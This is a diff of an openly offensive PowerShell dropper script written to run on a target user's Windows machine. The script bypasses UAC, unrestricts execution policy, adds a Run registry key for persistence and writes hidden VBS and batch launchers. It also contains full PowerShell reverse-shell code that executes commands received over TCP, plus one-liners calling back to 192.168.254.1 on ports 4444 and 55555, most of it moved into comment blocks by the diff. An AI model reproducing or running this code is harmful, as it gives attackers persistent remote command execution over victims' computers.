@@ -1,4 +1,3 @@
-
 <#
 	This script when run by the target user will do a number of things
 	1. run some simple commands (e.g. ipconfig /all)
@@ -23,8 +22,9 @@
 param (
     $DesktopPath = [Environment]::GetFolderPath("Desktop"),
     $tempDir = $env:tmp,
-	$runOnceRegKey = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
+	$runRegKey = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
     $startvbsStart = "$tempDir\startvbsStart.bat",
+    $vbsStartVBS = "$tempDir\vbsStart.vbs",
     $startPowershell = "$tempDir\startPowershell.bat",
 	$bypassUAC = "$tempDir\bypassUAC.ps1",
     $dropperscript = "$tempDir\dropper.ps1",
@@ -102,18 +102,25 @@ function Get-NetInfo {
 # here powershell is writing the files needed to actually run the deeper level powershell actions as well as creating the hidden persistence on the target
 function Create-Files {
 @'
-CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+command = "powershell.exe -nologo -command C:\Users\ADMINI~1\AppData\Local\Temp\Get-Persistence.ps1"
+ set shell = CreateObject("WScript.Shell")
+ shell.Run command,0
 '@ | Out-File $vbsStartVBS -Encoding oem
 
 @'
-wscript.exe "C:\Users\Administrator\AppData\Local\Temp\vbsStart.vbs" "C:\Users\Administrator\AppData\Local\Temp\startPowershell.bat"
+start-process notepad
+'@ | Out-File $getPersistence -Encoding oem
+
+<#
+@'
+wscript.exe "C:\Users\ADMINI~1\AppData\Local\Temp\vbsStart.vbs" "C:\Users\ADMINI~1\AppData\Local\Temp\startPowershell.bat"
 '@ | Out-File $startvbsStart -Encoding oem
 
 @'
 REM powershell -ExecutionPolicy Bypass -File Get-Persistence.ps1 -Verb RunAs"
-powershell.exe -Command "Start-Process cmd -ArgumentList '/k powershell Get-Persistence.ps1' -Verb RunAs"
+powershell.exe -Command "Start-Process cmd -ArgumentList '/k powershell C:\Users\ADMINI~1\AppData\Local\Temp\Get-Persistence.ps1' -Verb RunAs"
 '@ | Out-File $startPowershell -Encoding oem
-
+#>
 }
 
 # collect items of interest from target and put them in a zip
@@ -152,57 +159,13 @@ function Invoke-RebootPrompt {
 ###             secret sauce              ###
 #############################################
 <#
+REM CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
     this is the part where we hack the gibson you !@#$$
 	more accurately where we write the file written by the main script executed by the target user
     and the path to this file added to the registry so it will run as system at reboot so this is where 
 	we get shell...hopefully every time they reboot for a while at least
+# cmd.exe /c start cmd /k echo "hello"
 #>
-@'
-# there are plenty of reverse shell ideas out there this is one i will test with
-# i found this on the internet a while ago but don't remember where
- while (1 -eq 1)
-{
-    $ErrorActionPreference = 'Continue';
-    try
-    {
-        #attempt inital connection
-        $client = New-Object System.Net.Sockets.TCPClient("0.0.0.0",4444);
-        $stream = $client.GetStream();
-        [byte[]]$bytes = 0..255|%{0};
-        $sendbytes = ([text.encoding]::ASCII).GetBytes("Client Connected..."+"`n`n" + "PS " + (pwd).Path + "> ");
-        $stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush();
-        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
-        {
-            $recdata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-            if($recdata.StartsWith("kill-link")){ cls; $client.Close(); exit;}
-            try
-            {
-                #attempt to execute the received command
-                $sendback = (iex $recdata 2>&1 | Out-String );
-                $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
-            }
-            catch
-            {
-                $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
-                $sendback2  =  "ERROR: " + $error[0].ToString() + "`n`n" + "PS " + (pwd).Path + "> ";
-                cls;
-            }
-            $returnbytes = ([text.encoding]::ASCII).GetBytes($sendback2);
-            $stream.Write($returnbytes,0,$returnbytes.Length);$stream.Flush();          
-        }
-    }
-    catch 
-    {
-        #an initial connection error - close and wait 30 secs then retry
-        if($client.Connected)
-        {
-            $client.Close();
-        }
-        cls;
-        Start-Sleep -s 30;
-    }     
-}
-'@ | Out-File $getPersistence -Encoding oem
 
 #############################################
 ###           end secret sauce            ###
@@ -213,7 +176,7 @@ function Invoke-RebootPrompt {
 
 	Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
 	Simple-BypassUAC
-	if (!(Test-Path($runOnceRegKey))) { New-ItemProperty -Path $runOnceRegKey -Name "dropperScript" -Value $startvbsStart -Force }
+	New-ItemProperty -Path $runRegKey -Name "dropperScript" -Value $vbsStartVBS -Force
 	Create-Files
 
 #############################################
@@ -259,3 +222,55 @@ start the .bat that starts the ps1 invisibly to user we write this file:
 #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
 #$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 #$sm = (New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+
+
+
+<#
+# there are plenty of reverse shell ideas out there this is one i will test with
+# i found this on the internet a while ago but don't remember where
+ while (1 -eq 1)
+{
+    $ErrorActionPreference = 'Continue';
+    try
+    {
+        #attempt inital connection
+        $client = New-Object System.Net.Sockets.TCPClient("0.0.0.0",4444);
+        $stream = $client.GetStream();
+        [byte[]]$bytes = 0..255|%{0};
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Client Connected..."+"`n`n" + "PS " + (pwd).Path + "> ");
+        $stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush();
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $recdata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+            if($recdata.StartsWith("kill-link")){ cls; $client.Close(); exit;}
+            try
+            {
+                #attempt to execute the received command
+                $sendback = (iex $recdata 2>&1 | Out-String );
+                $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
+            }
+            catch
+            {
+                $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
+                $sendback2  =  "ERROR: " + $error[0].ToString() + "`n`n" + "PS " + (pwd).Path + "> ";
+                cls;
+            }
+            $returnbytes = ([text.encoding]::ASCII).GetBytes($sendback2);
+            $stream.Write($returnbytes,0,$returnbytes.Length);$stream.Flush();          
+        }
+    }
+    catch 
+    {
+        #an initial connection error - close and wait 30 secs then retry
+        if($client.Connected)
+        {
+            $client.Close();
+        }
+        cls;
+        Start-Sleep -s 30;
+    }     
+}
+#>
+
+
+
